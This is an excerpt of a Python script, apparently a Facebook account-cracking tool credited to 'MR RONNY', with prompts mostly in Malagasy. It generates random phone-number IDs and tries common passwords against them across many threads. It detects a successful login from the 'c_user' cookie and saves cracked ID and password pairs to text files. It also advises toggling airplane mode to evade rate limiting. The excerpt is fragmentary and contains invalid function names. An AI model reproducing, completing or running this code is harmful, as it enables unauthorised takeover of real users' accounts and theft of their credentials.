...
--------------------------------------------------
[•] OWNER      : \x1b[38;5;208mMR RONNY
[•] GITHUB     : \x1b[38;5;208mRONNYNAMED
[•] TOOL TYPE  : \x1b[38;5;208mRANDOM\033[1;37m
[•] STATUS     : \x1b[38;5;208mMANDOA VOLA\033[1;37m
--------------------------------------------------
...
cps = []
try:
    print('\n\033[1;37m[•] MIANDRY AMIN'NY FANAMBOARANA')
...
def RONNYXD():
	...
	if gh =='1':
		...
		print('[•] MISAOTRA NAMPIASA ')
		time.sleep(3)
		exit()
	else:
		print('[•] SAFIDIO OPTION MARINA')
		time.sleep(2)
		SIAL()
...
def pubg():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('[•] KAONTY ALAINAO    : \033[1;32m'+tl)
		print('\033[1;37m[•] APETAO KAODY     : \033[1;32m'+kode)
		print('\033[1;37m[•] FIDIO METAODY : \033[1;32m2008')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'nirina','malala','faniry']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Vita Soamantsara')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	input('Press Enter To Go Back To Menu')
	SIAL-ZADA()
...
def ff():
	...
	os.system('clear')
	print(logo)
	print('[√] OHATRA :26134,26133,26132')
	lines()
	kode = input('[+]\033[1;37m PUT KAODY MAHAZATRA : ')
	os.system('clear')
	print(logo)
	print('[•] FETRA AMBONY [1000]')
	lines()
	limit = int(input('[•] APETAO FETRA :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('[•] OHATRA : 088***,88***,88****,88****,.ETC')
	lines()
	kode = input('[•]\033[1;37m APETAO KAODY MAHAZATRA : ')
	os.system('clear')
	print(logo)
	print('[•] FETRA AMBONY [1000]')
	lines()
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] APETAO KAODY     : \033[1;32m'+kode)
		print('\033[1;37m[•] FIDIO METAODY : \033[1;32mBANGLA')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
		     uid = kode+guru
	...
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Tsindrio Raha Iverina Ianao')
	RONNY-XD()
...
def chos():
    ...
    os.system("clear")
    print(logo)
    print('\x1b[1;91m[•] KAODY MAHAZATRA: ')
    lines()
    ...
    os.system("clear")
    print(logo)
    print('[•] OHATRA :  1,2,3,4,5,6,7,8,9,Etc')
    lines()
    passx = int(input("[•] APETAO ISANY TENY MIAFINA : "))
    RONNYXD = []
    os.system('clear')
    print(logo)
    print('[•] OHATRA : malala,nirina,faniry,sns')
    lines()
    for bilal in range(passx):
        pww = input(f"[•] TENY MIAFINA {bilal+1} : ")
        RONNYXD.append(pww)
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent':pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[RONNY-XD-OK] '+cid+' | '+ps+'\x1b[1;97m')
                open('RONNY-XD-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;33m[RONNY-XD-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('RONNY-XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mADDICTOR-RONNY-XD\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass